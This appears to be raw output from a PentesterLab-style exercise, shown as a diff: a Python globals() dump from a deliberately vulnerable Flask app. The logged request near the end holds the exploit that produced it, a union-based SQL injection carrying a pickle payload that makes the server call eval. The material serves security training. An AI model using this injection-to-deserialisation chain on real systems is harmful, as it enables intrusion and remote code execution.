@@ -1,0 +1,62 @@
+{'url_for': <function url_for at 0x7fd9c61d8b70>, 'Box': <class 'vulnerable.Box'>, 'session': <SecureCookieSession {}>, '__file__':
+'/var/www/vulnerable.py', 'IntegrityError': <class 'sqlalchemy.exc.IntegrityError'>, 'c': <vulnerable.Category object at 0x7fd9c51b6a58>,
+'base64': <module 'base64' from '/usr/lib/python3.4/base64.py'>, 'DbObject': <class 'vulnerable.DbObject'>, 'os': <module 'os' from
+'/usr/lib/python3.4/os.py'>, 'flash': <function flash at 0x7fd9c61d8c80>, 'b': <vulnerable.Category object at 0x7fd9c51b6978>, 'Table':
+<class 'vulnerable.Table'>, 'x': <vulnerable.DbObject object at 0x7fd9c51b6cc0>, 'pickle': <module 'pickle' from
+'/usr/lib/python3.4/pickle.py'>, '__package__': '', 'Flask': <class 'flask.app.Flask'>, 'hmac': <module 'hmac' from
+'/usr/lib/python3.4/hmac.py'>, '__cached__': '/var/www/__pycache__/vulnerable.cpython-34.pyc', 'index': <function index at
+0x7fd9c51aa730>, '__builtins__': {'SyntaxError': <class 'SyntaxError'>, 'PermissionError': <class 'PermissionError'>,
+'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast
+of thousands for supporting Python development. See www.python.org for more information., 'hex': <built-in function hex>, 'TypeError':
+<class 'TypeError'>, 'license': Type license() to see the full license text, 'pow': <built-in function pow>, 'exit': Use exit() or Ctrl-D
+(i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2014 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com.
+All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995
+Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'UnicodeError': <class 'UnicodeError'>, 'bin': <built-in function bin>,
+'setattr': <built-in function setattr>, 'int': <class 'int'>, 'abs': <built-in function abs>, 'repr': <built-in function repr>,
+'NameError': <class 'NameError'>, 'Exception': <class 'Exception'>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'oct': <built-in
+function oct>, 'enumerate': <class 'enumerate'>, 'False': False, 'IndentationError': <class 'IndentationError'>, '__name__': 'builtins',
+'len': <built-in function len>, 'NotImplementedError': <class 'NotImplementedError'>, 'ascii': <built-in function ascii>, '	':
+<built-in function format>, 'EnvironmentError': <class 'OSError'>, 'tuple': <class 'tuple'>, 'memoryview': <class 'memoryview'>, 'True':
+True, 'issubclass': <built-in function issubclass>, 'FileExistsError': <class 'FileExistsError'>, 'sum': <built-in function sum>,
+'EOFError': <class 'EOFError'>, 'BytesWarning': <class 'BytesWarning'>, 'InterruptedError': <class 'InterruptedError'>, 'property': <class
+'property'>, '__build_class__': <built-in function __build_class__>, 'SystemExit': <class 'SystemExit'>, 'hasattr': <built-in function
+hasattr>, 'input': <built-in function input>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AssertionError': <class
+'AssertionError'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'eval': <built-in function eval>, 'hash': <built-in function hash>,
+'UserWarning': <class 'UserWarning'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'Ellipsis': Ellipsis,
+'DeprecationWarning': <class 'DeprecationWarning'>, 'ReferenceError': <class 'ReferenceError'>, 'ord': <built-in function ord>, 'compile':
+<built-in function compile>, 'ConnectionResetError': <class 'ConnectionResetError'>, '__loader__': <class
+'_frozen_importlib.BuiltinImporter'>, 'print': <built-in function print>, 'ResourceWarning': <class 'ResourceWarning'>, 'frozenset':
+<class 'frozenset'>, '__package__': '', 'iter': <built-in function iter>, 'IOError': <class 'OSError'>, 'globals': <built-in function
+globals>, 'TabError': <class 'TabError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'Warning': <class 'Warning'>, 'callable':
+<built-in function callable>, 'IndexError': <class 'IndexError'>, 'isinstance': <built-in function isinstance>, 'bool': <class 'bool'>,
+'bytearray': <class 'bytearray'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'str': <class 'str'>, 'ValueError': <class
+'ValueError'>, 'MemoryError': <class 'MemoryError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'exec': <built-in function exec>,
+'next': <built-in function next>, 'object': <class 'object'>, 'KeyError': <class 'KeyError'>, 'ZeroDivisionError': <class
+'ZeroDivisionError'>, '__debug__': True, 'bytes': <class 'bytes'>, 'divmod': <built-in function divmod>, 'FloatingPointError': <class
+'FloatingPointError'>, 'round': <built-in function round>, 'filter': <class 'filter'>, 'open': <built-in function open>, 'staticmethod':
+<class 'staticmethod'>, 'super': <class 'super'>, 'max': <built-in function max>, 'ImportError': <class 'ImportError'>, 'id': <built-in
+function id>, 'ChildProcessError': <class 'ChildProcessError'>, 'delattr': <built-in function delattr>, 'set': <class 'set'>,
+'NotADirectoryError': <class 'NotADirectoryError'>, 'complex': <class 'complex'>, 'BlockingIOError': <class 'BlockingIOError'>,
+'ProcessLookupError': <class 'ProcessLookupError'>, 'ConnectionError': <class 'ConnectionError'>, 'getattr': <built-in function getattr>,
+'BufferError': <class 'BufferError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'reversed': <class 'reversed'>, 'AttributeError':
+<class 'AttributeError'>, 'sorted': <built-in function sorted>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'SyntaxWarning':
+<class 'SyntaxWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'RuntimeError':
+<class 'RuntimeError'>, 'type': <class 'type'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'help': Type help() for interactive help, or
+help(object) for help about object., 'OSError': <class 'OSError'>, 'chr': <built-in function chr>, 'dir': <built-in function dir>,
+'FutureWarning': <class 'FutureWarning'>, 'any': <built-in function any>, 'locals': <built-in function locals>, 'TimeoutError': <class
+'TimeoutError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'None': None, 'BaseException': <class 'BaseException'>,
+'NotImplemented': NotImplemented, 'GeneratorExit': <class 'GeneratorExit'>, 'StopIteration': <class 'StopIteration'>, 'min': <built-in
+function min>, 'slice': <class 'slice'>, 'range': <class 'range'>, 'list': <class 'list'>, 'dict': <class 'dict'>, 'map': <class 'map'>,
+'vars': <built-in function vars>, 'OverflowError': <class 'OverflowError'>, 'LookupError': <class 'LookupError'>, '__import__': <built-in
+function __import__>, 'ArithmeticError': <class 'ArithmeticError'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'all': <built-in
+function all>, 'float': <class 'float'>, '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil'
+object; Ellipsis represents `...' in slices.", '__spec__': ModuleSpec(name='builtins', loader=<class
+'_frozen_importlib.BuiltinImporter'>), 'SystemError': <class 'SystemError'>, 'classmethod': <class 'classmethod'>, 'zip': <class 'zip'>},
+'db': <SQLAlchemy engine='sqlite:////tmp/pentesterlab.db'>, 'make_response': <function make_response at 0x7fd9c61d8ae8>, '__loader__':
+<_frozen_importlib.SourceFileLoader object at 0x7fd9d82b6c88>, '__name__': 'vulnerable', 'redirect': <function redirect at
+0x7fd9c6600730>, 'z': <vulnerable.DbObject object at 0x7fd9c4c76ef0>, 'render_template': <function render_template at 0x7fd9c5b35ea0>,
+'y': <vulnerable.DbObject object at 0x7fd9c51b6d68>, '	': <class 'flask_sqlalchemy.SQLAlchemy'>, 'w': <vulnerable.DbObject object
+at 0x7fd9c4c76b38>, 'request': <Request 'http://54.84.124.93/?cat=1+and+1=2+union+select+1,2,"c__builtin__ eval (S'globals()'
+tR.",4%2F**%2F' [GET]>, '__doc__': None, 'Category': <class 'vulnerable.Category'>, '__spec__': ModuleSpec(name='vulnerable',
+loader=<_frozen_importlib.SourceFileLoader object at 0x7fd9d82b6c88>, origin='/var/www/vulnerable.py'), 'application': <Flask
+'vulnerable'>, 'hashlib': <module 'hashlib' from '/usr/lib/python3.4/hashlib.py'>, 'a': <vulnerable.Category object at 0x7fd9c51807f0>} 4
